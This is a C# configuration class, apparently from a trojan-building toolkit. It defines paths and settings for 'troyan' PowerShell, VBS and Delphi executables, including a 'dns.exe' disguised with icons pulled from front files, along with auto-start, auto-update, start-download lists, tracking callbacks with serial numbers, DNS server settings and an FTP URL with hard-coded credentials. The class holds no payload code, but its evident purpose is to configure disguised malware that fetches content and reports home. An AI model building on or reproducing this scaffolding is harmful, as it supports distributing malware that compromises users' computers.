using System.ComponentModel.DataAnnotations;
using System.Text.Json.Serialization;
using Newtonsoft.Json.Linq;

namespace model
{

    public class ServerModel
    {
        [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
        // statics
        [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;

        [JsonPropertyName("domainController")]
        public string DomainController => ServerModelLoader.DomainControllerStatic;

        [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
        [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
        [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
        [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
        [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
        [JsonPropertyName("publishedDataDir")] public string PublishedDataDir => ServerModelLoader.PublishedDataDirStatic;
        
        public string UpdateFile  { get; set; }
        
        [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
        [JsonPropertyName("troyanScript")] public string TroyanScript => Path.Join(TroyanDir, ".\\_output\\troyan.ps1");
        
        [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
        [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
        [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
        [JsonPropertyName("troyanVbsFile")] public string TroyanVbsFile => Path.Join(TroyanVbsDir, "troyan.vbs");
        [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
        [JsonPropertyName("troyanDelphiProj")] public string TroyanDelphiProj => Path.Join(TroyanDelphiDir, "dns.dpr");
        [JsonPropertyName("troyanDelphiIco")] public string TroyanDelphiIco => Path.Join(TroyanDelphiDir, "_icon.ico");
        
        [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");

        // server-depended
        [JsonPropertyName("server")] public string Server { get; set; }
        [JsonPropertyName("alias")] public string Alias { get; set; }
        
        [JsonPropertyName("strahServer")] public string StrahServer { get; set; }
        [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
        [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
        [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troyan.exe");
        [JsonPropertyName("userVbsFile")] public string UserVbsFile => Path.Join(UserDataDir, "troyan.vbs");
        [JsonPropertyName("userPowershellFile")] public string UserPowershellFile => Path.Join(UserDataDir, "troyan.txt");
        [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");

        //FTP
        [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
        [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
        
        
        //Update
        [JsonPropertyName("updateUrl")]
        public string UpdateUrl  { get; set; }
        


        // properties
        [JsonPropertyName("login")] public string Login { get; set; }

        [JsonPropertyName("password")] public string Password { get; set; }

        [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }

        [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }

        [JsonPropertyName("track")] public bool Track { get; set; }

        [JsonPropertyName("trackSerie")] public string TrackingSerie { get; set; } = "001";

        [JsonPropertyName("trackingUrl")] public string TrackingUrl { get; set; }
        [JsonPropertyName("trackingPost")] public string TrackingPost { get; set; }
        [JsonPropertyName("trackingMethod")] public string TrackingMethod { get; set; } = "GET";

        [JsonPropertyName("trackingPreview")]
        public string TrackingPreview
        {
            get
            {
                var url = TrackingUrl;
                if (string.IsNullOrEmpty(url))
                    url = "";
                const string serieKeyword = "{SERIE}";
                const string numberKeyword = "{NUMBER}";

                bool containsSerie = url.Contains(serieKeyword);
                bool containsNumber = url.Contains(numberKeyword);

                if (!containsSerie || !containsNumber)
                {
                    try
                    {
                        var uriBuilder = new UriBuilder(url);
                        var query = System.Web.HttpUtility.ParseQueryString(uriBuilder.Query);

                        if (!containsSerie)
                        {
                            query["serie"] = serieKeyword;
                        }

                        if (!containsNumber)
                        {
                            query["number"] = numberKeyword;
                        }
                        
                        uriBuilder.Query = query.ToString();
                        return uriBuilder.ToString();
                    }
                    catch (Exception e)
                    {
                        return "http://localhost?serie={SERIE}&number={NUMBER}";
                    }
                }

                return url;
            }
        }
        
        [JsonPropertyName("trackingPreviewPost")]
        public string TrackingPreviewPost
        {
            get
            {
                var jsonTemplate = TrackingPost;
                if (string.IsNullOrEmpty(jsonTemplate))
                    jsonTemplate = "";
                const string serieKeyword = "{SERIE}";
                const string numberKeyword = "{NUMBER}";

                JObject jsonObject;

                try
                {
                    jsonObject = JObject.Parse(jsonTemplate);
                }
                catch (Exception)
                {
                    jsonObject = new JObject
                    {
                        { "serie", serieKeyword },
                        { "number", numberKeyword }
                    };
                    return jsonObject.ToString();
                }
                
                bool containsSerie = jsonTemplate.Contains(serieKeyword);
                bool containsNumber = jsonTemplate.Contains(numberKeyword);

                if (!containsSerie)
                {
                    jsonObject.Add("serie", serieKeyword);
                }

                if (!containsNumber)
                {
                    jsonObject.Add("number", numberKeyword);
                }

                return jsonObject.ToString();
            }
        }
        
        [JsonPropertyName("autoStart")] public bool AutoStart { get; set; }

        [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; }

        [JsonPropertyName("domains")] public List<string> Domains { get; set; }

        [JsonPropertyName("interfaces")] public List<string> Interfaces { get; set; }

        [JsonPropertyName("ipDomains")] public Dictionary<string, string> IpDomains { get; set; }

        [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }
        
        [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; }

        [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }

        [JsonPropertyName("front")] public List<string> Front { get; set; }

        [JsonPropertyName("extractIconFromFront")]
        public bool ExtractIconFromFront { get; set; }

        [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }


        //resulting
        [JsonPropertyName("adminServers")]
        [JsonIgnore]
        public Dictionary<string, string>? AdminServers { get; set; }

        [JsonPropertyName("adminPassword")]
        [JsonIgnore]
        public string AdminPassword { get; set; }

        [JsonIgnore] public string? Result { get; set; }

        [JsonPropertyName("isValid")] public bool IsValid { get; set; }
        
        [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
        [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }

        //constructor
        public ServerModel()
        {
            IsValid = false;
            Server = "1.1.1.1";
            Login = "Administrator";
            Password = "password";
            Track = false;
            TrackingUrl = string.Empty;
            AutoStart = false;
            AutoUpdate = false;
            Domains = new List<string>();
            StartUrls = new List<string>();
            StartDownloads = new List<string>();
            Interfaces = new List<string>();
            Pushes = new List<string>();
            IpDomains = new();
            Front = new List<string>();
            ExtractIconFromFront = false;
            Embeddings = new List<string>();
        }
    }
}